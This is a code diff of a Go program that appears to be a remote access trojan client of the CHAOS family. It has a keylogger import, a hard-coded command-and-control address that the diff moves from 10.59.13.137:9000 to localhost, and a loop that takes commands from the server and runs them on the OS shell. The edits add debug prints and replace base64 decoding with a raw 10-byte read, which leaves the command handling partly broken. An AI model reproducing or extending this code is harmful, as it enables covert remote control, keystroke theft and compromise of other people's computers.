@@ -3,7 +3,9 @@ package main
 import (
 	"bufio"
 	"encoding/base64"
+	"fmt"
 	"github.com/matishsiao/goInfo"
+	"io"
 	"io/ioutil"
 	"kunpeng/keylogger"
 	"kunpeng/service"
@@ -15,7 +17,7 @@ import (
 )
 
 const (
-	IP                 = "10.59.13.137:9000"
+	IP                 = "127.0.0.1:9999"
 	FILENAME           = "FileNameCHAOS"
 	FOLDER_PATH        = "\\ProgramData"
 	FOLDER_EXT         = "\\NameFolderExtesion"
@@ -42,14 +44,25 @@ func Connect() {
 			Connect()
 		}
 	}
-
+	SendMessage(conn, "wwwwwwww")
+	buf := make([]byte, 10)
+	print("连接上了")
 	for {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
-		command, _ := bufio.NewReader(conn).ReadString('\n')
+		_, err = conn.Read(buf)
+		if err == io.EOF {
+			conn.Close()
+		}
+		fmt.Print(string(buf))
+		decodedCommand := string(buf)
+		command := string(decodedCommand)
+		//command, _ := bufio.NewReader(conn).ReadString('\n')
 		// When the command received are encoded,
 		// decode message received, and test on switch
-		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
+		//decodedCommand, _ := base64.StdEncoding.DecodeString(command)
+		print("ss")
+		print(decodedCommand)
 		switch string(decodedCommand) {
 
 		case "back":
@@ -163,7 +176,9 @@ func GetOSInformation() string {
 }
 
 func SendMessage(conn net.Conn, message string) {
+
 	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + newLine))
+
 }
 
 func ReceiveMessageStdEncoding(conn net.Conn) string {
